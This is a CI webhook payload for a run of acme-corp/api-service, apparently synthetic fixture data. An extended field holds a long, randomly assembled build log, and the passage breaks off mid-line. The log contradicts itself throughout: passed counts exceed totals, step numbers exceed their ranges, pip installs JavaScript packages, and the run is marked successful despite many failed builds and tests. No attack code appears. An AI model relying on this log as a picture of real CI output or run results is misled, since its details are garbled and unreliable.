{
  "action": "completed",
  "workflow_run": {
    "id": 880,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-927",
    "head_sha": "e89e49609522198f7516fa723a3297a034eaf242",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-11T12:47:48.371043Z",
    "updated_at": "2025-12-11T12:52:25.107738Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: install_dependencies ===\nyarn add: Done in 26.31s\n\u2713 All checks passed\n[12:47:48] INFO: Starting build process\n[12:47:48] WARN: Deprecated API usage\nArtifact downloaded: 45MB\nWaiting...\n\u2717 build failed with exit code 63\nWARNING: prettier has known vulnerabilities\nnpm install: added 434 packages\n\u2717 build failed with exit code 86\nyarn add: Done in 28.49s\nCreating production build...\nBundling vendor.css\nArtifact downloaded: 36MB\nnpm install: added 30 packages\n[12:47:48] INFO: Connecting to database\n[12:47:48] INFO: Connecting to database\nUsing Python 3.9\n[12:47:48] INFO: Request completed\n[12:47:48] DEBUG: Loading configuration\nWARNING: eslint has known vulnerabilities\n[12:47:48] DEBUG: Loading configuration\n\u2713 deploy completed\nStep 5/20: Testing\nCache hit for key-9130\nGET /health - 204 (72ms)\nWaiting...\nCompiling src/main.py...\nFetching from https://docker.io/package.json\nCompiling components/index.js...\nArtifact uploaded: build.tar.gz (6MB)\nStep 6/21: Deploying\nGenerating source maps...\nCompiling src/service.java...\n\u2713 Step 'setup' succeeded\nCompiling components/service.java...\nyarn add: Done in 7.62s\npip: Installing build dependencies...\n  PASS: integration/test_auth_login.spec.js\n[12:47:48] WARN: Deprecated API usage\npip install: Successfully installed eslint-1.9\nMinifying app.js\nProcessing...\n\u2717 build failed with exit code 35\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:48] DEBUG: Loading configuration\n[12:47:48] WARN: Deprecated API usage\nyarn add: Done in 24.9s\nWaiting...\nStep 17/25: Running migrations\n[12:47:48] DEBUG: Connection pool: 7 active\n\u2713 All checks passed\nStep 19/17: Testing\nCache hit for key-1420\nProcessing...\nnpm notice: package.json updated\nHEAD is now at b3d74f9\nArtifact uploaded: dist.zip (85MB)\nBuilding Docker image...\nVerifying...\nHEAD is now at e830dbf\nCreating production build...\nStep 8/22: Testing\npip install: Successfully installed express-4.19\nnpm install: resolved 1711 packages\n[12:47:48] INFO: Processing request\nTransforming 468 files...\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] INFO: Request completed\nBuilding Docker image...\n\u2713 All checks passed\n[12:47:48] WARN: Deprecated API usage\npip: Downloading axios-3.19.tar.gz\nDone.\nCompleted.\nMinifying app.js\n[12:47:48] INFO: Processing request\nFetching from https://githubusercontent.com/package.json\nAlready up to date.\nStep 19/19: Building\nCompiling src/main.py...\n[12:47:48] DEBUG: Memory usage: 685MB\n[12:47:48] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\nTLS handshake completed\nCompiling utils/index.js...\nHEAD is now at daf826f\nStep 15/16: Testing\nCache restored successfully (313MB)\nLoading...\nStep 13/15: Testing\n[12:47:48] INFO: Connecting to database\nStep 3/18: Testing\npip: Installing build dependencies...\n[12:47:48] DEBUG: Loading configuration\nnpm notice: package.json updated\nCreating production build...\n\u2713 deploy completed\nArtifact downloaded: 5MB\nHEAD is now at d13f3cc\nTest Suites: 50 passed, 24 total\nGenerating source maps...\nCache invalidated: build\n[12:47:48] DEBUG: Query executed in 33ms\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (14MB)\nLoading...\nArtifact downloaded: 13MB\nPushing to registry...\n[12:47:48] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWaiting...\nCache miss for key-7661\nWARNING: eslint has known vulnerabilities\nMinifying vendor.js\nWaiting...\nTransforming 120 files...\nnpm notice: package.json updated\nTime: 13.133s\n[12:47:48] DEBUG: Loading configuration\nFAILED: test_db_connect\nStep 15/17: Installing dependencies\nStep 20/17: Building\nEnvironment: test\nTest Suites: 40 passed, 33 total\nWARNING: webpack has known vulnerabilities\nUsing Node.js 15.17.10\nBuilding Docker image...\nLayer 5/12: RUN command\nChecking out develop branch\nCache miss for key-4401\nImage pulled successfully\nCache invalidated: dependencies\nCreating production build...\nPOST /upload - 200 (404ms)\nUsing Python 3.11\nArtifact uploaded: dist.zip (31MB)\n[12:47:48] DEBUG: Query executed in 3ms\nnpm install: resolved 682 packages\n[12:47:48] DEBUG: Memory usage: 1472MB\nCompiling utils/app.ts...\nBundling runtime.css\nTLS handshake completed\nArtifact uploaded: build.tar.gz (10MB)\nInstalling lodash@1.6.8\nCompiling utils/app.ts...\nStep 4/23: Installing dependencies\nnpm install: added 341 packages\nCache saved successfully\n\u2713 All checks passed\nCache hit for key-6901\n  PASS: unit/test_cache_hit.spec.js\nCoverage: 76% statements, 82% branches\nCache saved successfully\nnpm install: resolved 1056 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\npip: Collecting jest\n[12:47:48] INFO: Connecting to database\nTests: 427 passed, 68 total\nTransforming 340 files...\nCompleted.\nTests: 410 passed, 451 total\n\u2713 Task completed in 1032ms\nUsing Python 3.10\nCoverage: 78% statements, 82% branches\n[12:47:48] DEBUG: Loading configuration\n[12:47:48] DEBUG: Connection pool: 5 active\nGenerating source maps...\nUsing Python 3.10\n[12:47:48] ERROR: Connection failed\nWARNING: react has known vulnerabilities\nEnvironment: test\nException: TypeError\n\u2713 lint completed\nGenerating source maps...\nCache miss for key-4350\nCoverage: 93% statements, 98% branches\nPlatform: win32-x64\nCreating production build...\nReady.\nnpm install: resolved 1309 packages\n[12:47:48] INFO: Connecting to database\nCompiling utils/app.ts...\nCoverage: 73% statements, 90% branches\nTLS handshake completed\n[12:47:48] DEBUG: Loading configuration\n[12:47:48] DEBUG: Query executed in 50ms\n  PASS: test_db_connect (391ms)\nStep 12/16: Testing\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/app.ts...\nStep 13/21: Running migrations\n[12:47:48] DEBUG: Loading configuration\nGET /api - 201 (49ms)\nTest Suites: 37 passed, 22 total\nUploading artifact 'dist' (34 files)\nStep 6/24: Testing\nTransforming 152 files...\n[12:47:48] WARN: Deprecated API usage\nnpm install: added 335 packages\nHEAD is now at d8477c8\nTest Suites: 47 passed, 22 total\npip install: Successfully installed jest-5.5\nCache invalidated: node_modules\npip install: Successfully installed webpack-4.2\n  PASS: e2e/test_db_connect.spec.js\n[12:47:48] DEBUG: Memory usage: 1463MB\nWARNING: axios has known vulnerabilities\nTransforming 722 files...\nConnection established\nnpm notice: package.json updated\nInstalling lodash@3.9.2\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\n[12:47:48] INFO: Cache refreshed\nTests: 416 passed, 213 total\nMinifying app.js\nFetching submodules...\n\u2713 validate completed\nCoverage: 92% statements, 78% branches\nStep 12/21: Building\n[12:47:48] INFO: Cache refreshed\nCompiling components/index.js...\nTLS handshake completed\n\u2713 All checks passed\nGenerating source maps...\nGET /status - 204 (44ms)\nBundling vendor.js\nnpm install: resolved 769 packages\nCreating production build...\nCompiling src/main.py...\nDone.\nTLS handshake completed\nCompiling lib/handler.rs...\n[12:47:48] DEBUG: Loading configuration\nEnvironment: production\nCache miss for key-4581\nInstalling express@5.14.9\nLayer 2/11: COPY command\nTLS handshake completed\n[12:47:48] DEBUG: Initializing service\nOK\nCache restored successfully (17MB)\nnpm notice: created a lockfile\n  PASS: test_auth_login (193ms)\nCache saved successfully\n\u2713 Task completed in 2728ms\nCache invalidated: node_modules\n[12:47:48] INFO: Processing request\nCompiling src/service.java...\n[12:47:48] INFO: Request completed\nCompleted.\n[12:47:48] DEBUG: Query executed in 41ms\n[12:47:48] INFO: Starting build process\nGET /api - 201 (90ms)\nnpm notice: package.json updated\nImage pulled successfully\nPlatform: darwin-arm64\nCache invalidated: node_modules\npip install: Successfully installed prettier-4.13\nyarn add: Done in 7.76s\nSnapshots: 50 passed, 49 total\nBundling vendor.js\nCreating production build...\n\u2713 All checks passed\npip: Collecting webpack\nUploading artifact 'dist' (4 files)\npip: Downloading webpack-2.7.tar.gz\nStep 16/15: Installing dependencies\nOptimizing 86 modules...\n=== Step install_dependencies completed ===\n=== Step: checkout ===\n  PASS: test_auth_login (129ms)\n\u2713 Step 'build' succeeded\nVerifying...\nnpm notice: created a lockfile\nReady.\n[12:47:48] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 1/23: Installing dependencies\nCompiling src/main.py...\nStep 8/24: Installing dependencies\nCache invalidated: node_modules\nUploading artifact 'dist' (42 files)\n[12:47:48] DEBUG: Connection pool: 9 active\nGenerating source maps...\nPushing to registry...\nInstalling react@4.1.5\n[12:47:48] WARN: Deprecated API usage\nUploading artifact 'coverage' (39 files)\nStep 10/19: Building\nFinished.\nLoading...\nBuilding Docker image...\nCache saved successfully\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 17.40s\nCompiling src/handler.rs...\nnpm notice: created a lockfile\nStep 19/24: Linting\nCache invalidated: dependencies\nStep 10/15: Running migrations\nCache miss for key-2912\n[12:47:48] INFO: Starting build process\n\u2713 deploy completed\nCache invalidated: dependencies\nReady.\nLayer 5/10: ENV command\nOptimizing 12 modules...\npip: Installing build dependencies...\n\u2713 deploy completed\nImage pulled successfully\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] DEBUG: Initializing service\nReady.\n[12:47:48] DEBUG: Query executed in 49ms\nyarn add: Done in 15.71s\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (14MB)\nFAILED: test_cache_hit\nHEAD is now at dd1106b\nPushing to registry...\nAlready up to date.\nPushing to registry...\nStep 7/21: Running migrations\n[12:47:48] INFO: Starting build process\nCache invalidated: node_modules\n[12:47:48] INFO: Connecting to database\nBuilding Docker image...\nCoverage: 71% statements, 99% branches\nCache saved successfully\nChecking out develop branch\nOptimizing 50 modules...\nOptimizing 47 modules...\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: dist.zip (89MB)\n  PASS: e2e/test_user_create.spec.js\npip: Downloading react-3.3.tar.gz\nFetching from https://pypi.org/package.json\nProcessing...\nSnapshots: 44 passed, 26 total\n  PASS: test_cache_hit (421ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nOK\n[12:47:48] INFO: Cache refreshed\nStep 20/19: Running migrations\npip: Collecting express\nCompleted.\nChecking out master branch\nCoverage: 95% statements, 76% branches\nLoading...\n[12:47:48] INFO: Request completed\nTime: 109.643s\nTest Suites: 34 passed, 16 total\nCache invalidated: node_modules\nPOST /api - 200 (162ms)\nTests: 218 passed, 427 total\nCompiling utils/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'bugfix/task-722'\nArtifact downloaded: 7MB\nCache saved successfully\n[12:47:48] DEBUG: Memory usage: 1293MB\npip: Downloading jest-5.14.tar.gz\nCompiling utils/app.ts...\nArtifact uploaded: dist.zip (83MB)\n[12:47:48] INFO: Connecting to database\nOK\n[12:47:48] WARN: Deprecated API usage\nLayer 5/10: RUN command\nSnapshots: 45 passed, 49 total\nDone.\nArtifact downloaded: 38MB\nGET /status - 200 (55ms)\nTests: 192 passed, 276 total\nPushing to registry...\n[12:47:48] WARN: Deprecated API usage\nOK\nCompleted.\nTime: 63.83s\nStep 15/22: Deploying\nWARNING: eslint has known vulnerabilities\nReady.\nLayer 5/12: COPY command\n[12:47:48] ERROR: Connection failed\nOptimizing 91 modules...\nChecking out master branch\nGenerating source maps...\nCache saved successfully\nyarn add: Done in 15.28s\nCompiling src/handler.rs...\nReady.\nCache saved successfully\nCache hit for key-6333\nPOST /data - 201 (126ms)\nFinished.\nException: NullPointerException\nStep 9/15: Deploying\nWARNING: jest has known vulnerabilities\nFetching submodules...\nBuilding Docker image...\nCache saved successfully\nLayer 9/8: COPY command\n[12:47:48] INFO: Request completed\nStep 5/25: Running migrations\n[12:47:48] WARN: Deprecated API usage\nStep 11/18: Testing\nTests: 168 passed, 383 total\nRan 33 tests in 24s\nPulling image: alpine:3.11\nGenerating source maps...\nTest Suites: 41 passed, 15 total\npip: Collecting jest\n  PASS: test_auth_login (82ms)\nBuilding Docker image...\npip: Collecting prettier\n  PASS: unit/test_auth_login.spec.js\nRan 13 tests in 9s\nPulling image: python:3.11\nCache restored successfully (254MB)\nCache miss for key-3228\nWARNING: prettier has known vulnerabilities\nEnvironment: production\nGenerating source maps...\nTransforming 333 files...\nArtifact uploaded: build.tar.gz (21MB)\n[12:47:48] DEBUG: Connection pool: 15 active\nTest Suites: 32 passed, 18 total\n\u2713 All checks passed\n[12:47:48] INFO: Starting build process\nDone.\nVerifying...\nEnvironment: production\nBundling styles.css\nStep 20/17: Linting\nFetching from https://googleapis.com/package.json\nProcessing...\nnpm notice: created a lockfile\npip: Downloading express-3.20.tar.gz\nBuilding Docker image...\nUploading artifact 'coverage' (50 files)\nFAILED: test_cache_hit\n[12:47:48] WARN: Deprecated API usage\n[12:47:48] INFO: Cache refreshed\nnpm install: added 422 packages\nOK\nUsing Node.js 20.2.5\nCache restored successfully (200MB)\npip: Downloading webpack-2.9.tar.gz\nnpm notice: created a lockfile\nVerifying...\n[12:47:48] INFO: Processing request\nFetching from https://github.com/package.json\nPulling image: alpine:18\nException: TypeError\nConnection established\nCompleted.\n[12:47:48] DEBUG: Loading configuration\nCache miss for key-8677\nImage pulled successfully\nStep 18/20: Building\nCompleted.\n[12:47:48] INFO: Processing request\nStep 3/15: Installing dependencies\n[12:47:48] INFO: Cache refreshed\nSuccess!\nVerifying...\nLoading...\n[12:47:48] INFO: Connecting to database\nUploading artifact 'build' (12 files)\n\u2713 All checks passed\nStep 7/19: Installing dependencies\npip: Installing build dependencies...\npip: Collecting express\nTime: 89.243s\nOK\nFetching from https://googleapis.com/package.json\nCache invalidated: dependencies\n[12:47:48] DEBUG: Query executed in 26ms\nCompleted.\n[12:47:48] INFO: Starting build process\nPlatform: win32-x64\nRan 160 tests in 13s\nReady.\nTLS handshake completed\npip install: Successfully installed webpack-2.0\nCache restored successfully (408MB)\nTime: 72.340s\nFinished.\nImage pulled successfully\nCache hit for key-9098\nDone.\n[12:47:48] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nSnapshots: 35 passed, 49 total\n[12:47:48] DEBUG: Memory usage: 1451MB\nFetching from https://docker.io/package.json\nFetching from https://amazonaws.com/package.json\nSnapshots: 39 passed, 34 total\nInstalling webpack@1.15.7\n[12:47:48] DEBUG: Query executed in 50ms\nBuilding Docker image...\nStep 14/25: Running migrations\nLayer 7/8: RUN command\nConnection established\n[12:47:48] INFO: Processing request\npip: Downloading express-1.16.tar.gz\nCache invalidated: dependencies\nRan 63 tests in 14s\nSuccess!\n\u2717 build failed with exit code 89\nOK\nUsing Python 3.11\nGenerating source maps...\nEnvironment: production\nCache restored successfully (430MB)\n\u2717 build failed with exit code 103\nnpm install: added 305 packages\n  PASS: test_user_create (155ms)\nException: RuntimeError\nPOST /data - 201 (87ms)\nCompiling src/index.js...\nArtifact uploaded: dist.zip (64MB)\n[12:47:48] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:48] DEBUG: Connection pool: 13 active\nSwitched to branch 'feature/task-785'\nWARNING: react has known vulnerabilities\nStep 2/21: Linting\nPulling image: node:18\nEnvironment: staging\nFinished.\nTests: 111 passed, 461 total\nTLS handshake completed\n\u2713 deploy completed\nFetching from https://registry.npmjs.org/package.json\nStep 1/24: Building\nStep 10/18: Linting\n  PASS: e2e/test_api_health.spec.js\nnpm notice: package.json updated\nArtifact downloaded: 20MB\n\u2713 Task completed in 879ms\n=== Step checkout completed ===\n=== Step: deploy_production ===\nCompiling utils/handler.rs...\nCache miss for key-9071\nChecking out master branch\n  PASS: e2e/test_cache_hit.spec.js\nCompiling components/utils.go...\nDone.\n[12:47:48] DEBUG: Memory usage: 1968MB\nException: RuntimeError\nOK\nWARNING: lodash has known vulnerabilities\nUsing Python 3.11\n[12:47:48] DEBUG: Connection pool: 3 active\nnpm notice: package.json updated\n[12:47:48] WARN: Deprecated API usage\nReady.\nBundling main.css\n[12:47:48] WARN: Deprecated API usage\nCompiling lib/app.ts...\npip install: Successfully installed prettier-5.15\n[12:47:48] INFO: Connecting to database\n[12:47:48] INFO: Connecting to database\nTests: 393 passed, 318 total\nTime: 86.398s\nArtifact uploaded: build.tar.gz (19MB)\nyarn add: Done in 29.80s\nArtifact downloaded: 8MB\nNODE_ENV=development\n[12:47:48] INFO: Starting build process\n[12:47:48] WARN: Deprecated API usage\nFAILED: test_cache_hit\n[12:47:48] INFO: Cache refreshed\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 15/17: Deploying\nFetching from https://googleapis.com/package.json\nUploading artifact 'coverage' (14 files)\nPulling image: node:18\nCompiling src/handler.rs...\nnpm install: resolved 1544 packages\nnpm install: added 390 packages\nRan 71 tests in 58s\n\u2713 Task completed in 3420ms\nDone.\nStep 19/16: Installing dependencies\nStep 10/23: Building\n\u2713 deploy completed\n[12:47:48] ERROR: Connection failed\n[12:47:48] INFO: Processing request\nBuilding Docker image...\n\u2713 Task completed in 1154ms\nDone.\nLayer 7/10: ENV command\npip install: Successfully installed webpack-2.6\nStep 2/20: Testing\n\u2717 build failed with exit code 4\nnpm notice: created a lockfile\nCache miss for key-5538\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nHEAD is now at 423a99d\npip: Downloading axios-3.4.tar.gz\nBundling runtime.js\nProcessing...\nTLS handshake completed\nHEAD is now at acead55\nTime: 20.146s\n  PASS: integration/test_auth_login.spec.js\nTest Suites: 14 passed, 37 total\n[12:47:48] INFO: Starting build process\nEnvironment: development\nGET /health - 201 (28ms)\nPulling image: python:3.11\nTest Suites: 44 passed, 9 total\nArtifact uploaded: build.tar.gz (7MB)\nCompiling utils/main.py...\nUsing Python 3.12\n\u2713 validate completed\nPlatform: linux-x64\nSwitched to branch 'hotfix/task-799'\nCache miss for key-2045\n[12:47:48] INFO: Starting build process\nnpm notice: created a lockfile\n[12:47:48] DEBUG: Initializing service\nnpm install: added 375 packages\npip: Downloading axios-1.2.tar.gz\nCoverage: 70% statements, 94% branches\nCompiling utils/app.ts...\nSwitched to branch 'bugfix/task-710'\n\u2713 All checks passed\n  PASS: integration/test_db_connect.spec.js\nTest Suites: 12 passed, 26 total\nConnection established\nSuccess!\nStep 1/24: Linting\nCreating production build...\nPulling image: node:3.11\nWARNING: eslint has known vulnerabilities\nUsing Node.js 17.20.5\nFinished.\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\n[12:47:48] DEBUG: Loading configuration\n[12:47:48] INFO: Request completed\nEnvironment: production\nCache invalidated: build\nTransforming 389 files...\n[12:47:48] DEBUG: Memory usage: 347MB\n\u2713 lint completed\nyarn add: Done in 1.94s\nTime: 13.393s\npip: Downloading webpack-4.16.tar.gz\nTests: 448 passed, 418 total\nCompiling utils/handler.rs...\n[12:47:48] INFO: Processing request\n[12:47:48] DEBUG: Loading configuration\nnpm install: resolved 844 packages\n  PASS: test_db_connect (348ms)\nStep 9/24: Running migrations\nnpm install: resolved 1590 packages\nCache miss for key-7816\nBundling styles.js\n[12:47:48] DEBUG: Initializing service\nUsing Node.js 14.18.8\npip: Downloading webpack-2.0.tar.gz\n  PASS: test_api_health (59ms)\nArtifact downloaded: 17MB\nConnection established\nPlatform: darwin-arm64\nRan 127 tests in 45s\nWaiting...\nNODE_ENV=production\nTime: 108.621s\n[12:47:48] ERROR: Connection failed\nSwitched to branch 'bugfix/task-234'\npip install: Successfully installed axios-5.3\n[12:47:48] WARN: Deprecated API usage\nNODE_ENV=production\nInstalling react@1.18.6\nWARNING: lodash has known vulnerabilities\nStep 3/25: Running migrations\nCache invalidated: dependencies\nWARNING: eslint has known vulnerabilities\nTest Suites: 42 passed, 10 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTests: 75 passed, 199 total\n[12:47:48] DEBUG: Connection pool: 13 active\nnpm notice: package.json updated\nUsing Node.js 18.13.8\n\u2713 Task completed in 4532ms\nnpm notice: created a lockfile\nyarn add: Done in 29.1s\nImage pulled successfully\nArtifact uploaded: dist.zip (43MB)\nFetching from https://githubusercontent.com/package.json\nCache restored successfully (376MB)\nConnection established\n[12:47:48] DEBUG: Connection pool: 1 active\nCache saved successfully\nnpm install: added 137 packages\nOptimizing 100 modules...\nyarn add: Done in 16.3s\npip install: Successfully installed express-4.14\nAlready up to date.\nPulling image: alpine:latest\n[12:47:48] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: e2e/test_user_create.spec.js\nStep 8/19: Running migrations\nTransforming 830 files...\npip: Downloading react-1.4.tar.gz\nTLS handshake completed\n[12:47:48] DEBUG: Query executed in 98ms\nGET /api - 204 (72ms)\nnpm install: resolved 758 packages\nCache hit for key-4839\n[12:47:48] WARN: Deprecated API usage\nStep 8/19: Deploying\nBundling styles.js\nCache miss for key-4682\n\u2713 Step 'checkout' succeeded\nWaiting...\nCompiling components/handler.rs...\nCache restored successfully (29MB)\nReady.\npip: Installing build dependencies...\n  PASS: test_cache_hit (139ms)\npip: Collecting react\nPlatform: linux-x64\n\u2717 build failed with exit code 41\nSnapshots: 18 passed, 25 total\nCompiling src/main.py...\n[12:47:48] INFO: Request completed\nRan 117 tests in 50s\nNODE_ENV=test\nSuccess!\nBuilding Docker image...\n\u2717 build failed with exit code 77\n[12:47:48] DEBUG: Query executed in 52ms\n[12:47:48] INFO: Starting build process\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nCache hit for key-2450\nTime: 104.191s\nTLS handshake completed\nTest Suites: 24 passed, 31 total\nWARNING: express has known vulnerabilities\nHEAD is now at e1640e2\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache invalidated: node_modules\nGET /api - 200 (92ms)\nCache invalidated: build\nCompiling lib/main.py...\nFAILED: test_cache_hit\nCoverage: 76% statements, 94% branches\n\u2713 validate completed\nCompiling src/main.py...\nOptimizing 44 modules...\nyarn add: Done in 18.68s\nAlready up to date.\nLayer 9/11: COPY command\nPushing to registry...\nWARNING: eslint has known vulnerabilities\n[12:47:48] DEBUG: Connection pool: 19 active\n[12:47:48] WARN: Deprecated API usage\nWaiting...\nImage pulled successfully\nHEAD is now at 6ef2170\nStep 17/21: Building\n[12:47:48] INFO: Cache refreshed\nArtifact downloaded: 26MB\nTLS handshake completed\n[12:47:48] INFO: Connecting to database\nStep 9/24: Linting\n[12:47:48] DEBUG: Query executed in 85ms\nCreating production build...\nUsing Node.js 18.3.3\nStep 5/18: Deploying\nWARNING: eslint has known vulnerabilities\nCompiling utils/app.ts...\n[12:47:48] DEBUG: Connection pool: 16 active\npip: Installing build dependencies...\nSnapshots: 9 passed, 4 total\nFinished.\nCache invalidated: dependencies\nCache restored successfully (250MB)\nStep 7/21: Running migrations\nSwitched to branch 'bugfix/task-460'\nNODE_ENV=test\nFetching from https://pypi.org/package.json\nCache restored successfully (134MB)\nAlready up to date.\nStep 9/19: Linting\n  PASS: test_user_create (388ms)\nCompleted.\npip: Downloading jest-5.4.tar.gz\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Node.js 15.1.0\n[12:47:48] INFO: Cache refreshed\n[12:47:48] DEBUG: Initializing service\n[12:47:48] DEBUG: Query executed in 59ms\n[12:47:48] INFO: Cache refreshed\nGET /status - 200 (65ms)\nPulling image: alpine:latest\nReady.\nCache hit for key-5527\n[12:47:48] DEBUG: Initializing service\nCache restored successfully (377MB)\nFinished.\nLoading...\nFinished.\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\n\u2713 lint completed\nCache restored successfully (204MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:48] INFO: Starting build process\n\u2713 Step 'checkout' succeeded\nPulling image: node:latest\nCache invalidated: dependencies\nPushing to registry...\n[12:47:48] DEBUG: Connection pool: 10 active\nBundling main.js\nCompleted.\nLayer 9/15: RUN command\n[12:47:48] DEBUG: Loading configuration\nCoverage: 79% statements, 99% branches\nGET /health - 201 (68ms)\nStep 11/17: Running migrations\nnpm notice: created a lockfile\nReady.\n[12:47:48] ERROR: Connection failed\nLoading...\nProcessing...\nCompiling lib/index.js...\nCache invalidated: node_modules\nFetching submodules...\nBundling styles.js\nnpm install: resolved 1678 packages\nCache saved successfully\nArtifact downloaded: 18MB\n\u2713 package completed\nnpm install: added 205 packages\nLoading...\nArtifact uploaded: dist.zip (88MB)\nStep 14/23: Testing\nNODE_ENV=production\n[12:47:48] DEBUG: Memory usage: 742MB\nLayer 7/13: ENV command\n\u2713 Step 'checkout' succeeded\nChecking out develop branch\nCompleted.\n[12:47:48] INFO: Connecting to database\n[12:47:48] INFO: Processing request\nFetching from https://docker.io/package.json\n[12:47:48] DEBUG: Loading configuration\nCompiling utils/utils.go...\nStep 15/22: Deploying\nFinished.\nMinifying vendor.js\nFAILED: test_user_create\nRan 162 tests in 47s\nCompiling lib/index.js...\nCache restored successfully (498MB)\nnpm install: added 164 packages\nVerifying...\n[12:47:48] WARN: Deprecated API usage\nCache hit for key-3526\nNODE_ENV=production\nFAILED: test_api_health\nCompiling utils/index.js...\nCompiling utils/service.java...\nTests: 70 passed, 325 total\nPushing to registry...\nTime: 102.42s\nChecking out develop branch\nInstalling lodash@5.9.5\n[12:47:48] INFO: Request completed\nStep 7/25: Building\nnpm install: resolved 1380 packages\nFinished.\npip: Installing build dependencies...\nCompiling utils/main.py...\nyarn add: Done in 14.76s\nPulling image: python:18\nSwitched to branch 'feature/task-923'\nCompleted.\nLayer 8/15: ENV command\nNODE_ENV=development\nArtifact uploaded: dist.zip (61MB)\n[12:47:48] DEBUG: Query executed in 54ms\nReady.\nPushing to registry...\n[12:47:48] DEBUG: Memory usage: 975MB\nEnvironment: production\nLoading...\nStep 6/18: Installing dependencies\n[12:47:48] DEBUG: Loading configuration\npip: Collecting lodash\nWARNING: axios has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nTests: 129 passed, 264 total\nyarn add: Done in 27.2s\nArtifact uploaded: build.tar.gz (47MB)\nnpm install: added 285 packages\nStep 17/17: Running migrations\nRan 42 tests in 15s\nCreating production build...\n[12:47:48] INFO: Processing request\nCompiling components/service.java...\nStep 12/18: Linting\nLayer 1/15: ENV command\nnpm install: resolved 465 packages\nCompleted.\nException: RuntimeError\nLayer 9/9: COPY command\nBundling styles.css\nTransforming 655 files...\nArtifact downloaded: 37MB\nStep 11/24: Testing\nStep 8/20: Running migrations\nCompiling lib/app.ts...\nStep 15/22: Installing dependencies\nPushing to registry...\nDone.\n  PASS: e2e/test_db_connect.spec.js\nStep 6/22: Building\nBundling vendor.js\n\u2713 All checks passed\nWARNING: eslint has known vulnerabilities\n[12:47:48] INFO: Starting build process\nnpm notice: created a lockfile\nCache invalidated: build\nCompiling src/handler.rs...\nStep 14/24: Linting\n[12:47:48] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:47:48] DEBUG: Memory usage: 1186MB\n  PASS: unit/test_cache_hit.spec.js\n[12:47:48] DEBUG: Query executed in 41ms\npip install: Successfully installed eslint-2.5\nWARNING: express has known vulnerabilities\nCreating production build...\nLoading...\nReady.\nCache miss for key-5733\nLayer 1/12: ENV command\nSnapshots: 37 passed, 41 total\nDone.\nWaiting...\nBundling runtime.js\n\u2713 Step 'build' succeeded\n[12:47:48] INFO: Processing request\nnpm notice: package.json updated\nCompleted.\nCache miss for key-7910\nPushing to registry...\nStep 9/23: Running migrations\nFetching submodules...\nWaiting...\n[12:47:48] ERROR: Connection failed\nyarn add: Done in 24.60s\nCache saved successfully\nWARNING: express has known vulnerabilities\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nBuilding Docker image...\nArtifact uploaded: dist.zip (11MB)\nTime: 34.943s\nStep 3/24: Installing dependencies\nFAILED: test_auth_login\nCache invalidated: dependencies\nTests: 376 passed, 257 total\nTLS handshake completed\n\u2717 build failed with exit code 81\n[12:47:48] INFO: Request completed\nConnection established\nFetching submodules...\nPulling image: python:3.11\n[12:47:48] INFO: Request completed\npip: Installing build dependencies...\nReady.\nCache saved successfully\nFetching from https://amazonaws.com/package.json\nnpm notice: package.json updated\n[12:47:48] INFO: Request completed\nFetching submodules...\nPulling image: python:latest\nyarn add: Done in 6.15s\nSwitched to branch 'bugfix/task-234'\nPushing to registry...\npip: Installing build dependencies...\nCompiling components/service.java...\n[12:47:48] DEBUG: Initializing service\nSwitched to branch 'hotfix/task-346'\nTLS handshake completed\nStep 14/25: Deploying\npip: Collecting prettier\nArtifact downloaded: 15MB\nSuccess!\n[12:47:48] INFO: Processing request\nUsing Node.js 15.20.10\n  PASS: test_cache_hit (162ms)\nSnapshots: 48 passed, 11 total\n[12:47:48] DEBUG: Query executed in 15ms\nCompiling lib/main.py...\nProcessing...\n\u2713 Task completed in 2180ms\nArtifact downloaded: 47MB\nCache hit for key-9953\nCache miss for key-3965\nMinifying app.js\nnpm notice: package.json updated\nnpm install: added 139 packages\nUsing Node.js 16.18.8\nStep 11/24: Deploying\nBuilding Docker image...\nMinifying main.js\nGenerating source maps...\nArtifact uploaded: build.tar.gz (41MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\nPOST /upload - 201 (21ms)\nPlatform: linux-x64\nNODE_ENV=production\nTest Suites: 28 passed, 41 total\nnpm install: resolved 851 packages\npip: Collecting 